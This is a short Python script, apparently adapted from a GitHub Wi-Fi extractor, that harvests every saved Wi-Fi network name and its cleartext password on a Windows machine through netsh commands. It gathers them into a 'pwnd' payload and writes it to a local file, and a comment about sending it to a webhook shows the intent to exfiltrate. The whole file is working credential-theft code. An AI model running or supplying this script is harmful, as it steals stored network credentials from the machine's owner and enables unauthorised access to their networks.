import subprocess, os, sys, requests, re, urllib


#https://github.com/hmaverickadams/Windows-WiFi-Extractor

def wifiSnatch():
    # Lists and regex
    found_ssids = []
    pwnd = []
    wlan_profile_regex = r"All User Profile\s+:\s(.*)$"
    wlan_key_regex = r"Key Content\s+:\s(.*)$"

    #Use Python to execute Windows command
    get_profiles_command = subprocess.run(["netsh", "wlan", "show", "profiles"], stdout=subprocess.PIPE).stdout.decode()

    #Append found SSIDs to list
    matches = re.finditer(wlan_profile_regex, get_profiles_command, re.MULTILINE)
    for match in matches:
        for group in match.groups():
            found_ssids.append(group.strip())

    #Get cleartext password for found SSIDs and place into pwnd list
    for ssid in found_ssids:
        get_keys_command = subprocess.run(["netsh", "wlan", "show", "profile", ("%s" % (ssid)), "key=clear"], stdout=subprocess.PIPE).stdout.decode()
        matches = re.finditer(wlan_key_regex, get_keys_command, re.MULTILINE)
        for match in matches:
            for group in match.groups():
                pwnd.append({
                    "SSID":ssid,
                    "Password":group.strip()
                    })

    #Check if any pwnd Wi-Fi exists, if not exit
    if len(pwnd) == 0:
        print("No Wi-Fi profiles found. Exiting...")
        sys.exit()


    #Send the hackies to your webhookz
    final_payload = ""
    for pwnd_ssid in pwnd:
        final_payload += "\n[SSID: %s, Password: %s]\n ----------------------------------------------\n" % (pwnd_ssid["SSID"], pwnd_ssid["Password"]) # Payload display format can be changed as desired

    file_path = os.path.join(os.getcwd(), "file269446.txt")

    f = open("file543804.txt", "a")

    f.write(final_payload)
    f.close()

    return(final_payload)
